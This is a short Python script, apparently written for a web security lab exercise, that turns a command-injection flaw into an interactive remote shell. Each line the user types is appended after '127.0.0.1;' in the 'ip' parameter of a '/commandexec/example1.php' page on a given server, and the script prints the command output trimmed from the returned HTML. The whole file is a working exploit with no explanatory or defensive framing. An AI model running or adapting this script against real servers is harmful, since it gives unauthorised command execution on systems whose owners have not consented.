#!/usr/bin/env python

import sys
import os
import requests

def interactiveShell(siteIP):
	while True:
		inStr = input("lab3> ")
		if inStr == "exit":
			print("Good Bye")
			break
		else:
			httpReq = requests.get("http://" + siteIP + "/commandexec/example1.php?ip=127.0.0.1;" + inStr)
			httpReq = httpReq.text.split("\n");
			httpReq = "\n".join(httpReq[54 : len(httpReq)-13]);
			print(httpReq)
			
			
			#os.system(inStr)
	return


if __name__ == "__main__":
	n = len(sys.argv)
	if n != 2:
		print("Enter Server IP Address")
		print("Total arguments passed: ", n)
	else:
		args = sys.argv[1:]
		siteIP = args[0]
		interactiveShell(siteIP)
